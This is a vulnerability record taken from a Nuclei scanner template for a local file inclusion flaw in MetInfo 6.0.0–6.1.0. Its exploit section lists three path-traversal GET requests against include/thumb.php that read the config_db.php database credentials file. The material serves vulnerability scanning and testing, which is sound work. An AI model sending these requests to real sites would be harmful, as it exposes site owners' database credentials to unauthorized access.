# Nuclei Template: MetInfo <=6.1.0 - Local File Inclusion
**Template ID:** metinfo-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`metinfo-lfi.yaml`)

## Vulnerability Information & PoC

## Description
MetInfo 6.0.0 through 6.1.0 is vulnerable to local file inclusion and allows remote unauthenticated attackers access to locally stored files and their content.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php
GET {{BaseURL}}/include/thumb.php?dir=.....///http/.....///config/config_db.php
GET {{BaseURL}}/include/thumb.php?dir=http\\..\\..\\config\\config_db.php
```

## References
- https://paper.seebug.org/676/
